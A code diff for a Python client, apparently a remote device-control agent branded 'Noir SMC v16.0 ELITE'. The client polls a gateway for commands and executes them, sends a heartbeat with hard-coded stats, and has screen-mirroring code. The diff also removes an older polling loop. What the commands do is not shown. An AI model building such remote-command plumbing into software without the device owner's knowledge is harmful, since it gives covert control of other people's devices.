@@ -285,14 +285,29 @@ class SovereignCore(App):
                     data = resp.json()
                     commands = data.get("commands", [])
                     for cmd_data in commands:
-                        self._execute_command(cmd_data)
+                        self._execute(cmd_data)
                 
-                # Report Status (Telemetry)
+                # Report Status (Heartbeat)
                 self._report_status()
             except Exception as e:
                 noir_log(f"[POLL] Error: {e}", level="WARNING")
         
         threading.Thread(target=_task, daemon=True).start()
+
+    def _report_status(self):
+        """Send a periodic heartbeat to the gateway to show as 'Online'."""
+        try:
+            session.post(
+                f"{GATEWAY_URL}/agent/register",
+                headers={"Authorization": f"Bearer {API_KEY}"},
+                json={
+                    "device_id": DEVICE_ID, 
+                    "agent": "Noir SMC v16.0 ELITE",
+                    "stats": {"cpu": 10, "ram": 50}
+                },
+                timeout=5
+            )
+        except: pass
 
     def _screen_share_tick(self, dt):
         """High-Performance Adaptive Mirroring Tick (v16)."""
@@ -309,56 +324,7 @@ class SovereignCore(App):
             except: pass
         threading.Thread(target=_task, daemon=True).start()
 
-    def _main_loop(self):
-        """High-Frequency Dynamic Polling Engine (v14.0.4)."""
-        poll_interval = 2 
-        fail_count = 0
-        last_success = time.time()
 
-        while True:
-            try:
-                headers = {"Authorization": f"Bearer {API_KEY}"}
-                resp = session.get(
-                    f"{GATEWAY_URL}/agent/poll",
-                    headers=headers,
-                    params={"device_id": DEVICE_ID},
-                    timeout=20
-                )
-
-                if resp.status_code == 200:
-                    fail_count = 0
-                    last_success = time.time()
-                    data = resp.json()
-                    commands = data.get("commands", [])
-
-                    if commands:
-                        poll_interval = 1 # Immediate acceleration
-                        for cmd in commands:
-                            self._execute(cmd)
-                    else:
-                        # Adaptive slowing if no commands
-                        poll_interval = min(poll_interval + 1, 15)
-                
-                else:
-                    noir_log(f"[POLL] Gateway status: {resp.status_code}", level="WARNING")
-                    fail_count += 1
-
-            except Exception as e:
-                noir_log(f"[POLL] Neural Link Latency: {e}", level="WARNING")
-                fail_count += 1
-                # Aggressive Backoff
-                poll_interval = min(poll_interval * 2, 60)
-
-            # SELF-HEALING: Absolute Reconnection Protocol (v14.0.4)
-            if time.time() - last_success > 300:
-                noir_log("[SMC] 🆘 RECOVERING STALE LINK...", level="CRITICAL")
-                try:
-                    self._register()
-                    last_success = time.time()
-                    poll_interval = 2
-                except: pass
-            
-            time.sleep(poll_interval)
 
     def _execute(self, cmd_data):
         """Asynchronous Command Router (v14.0.4)."""
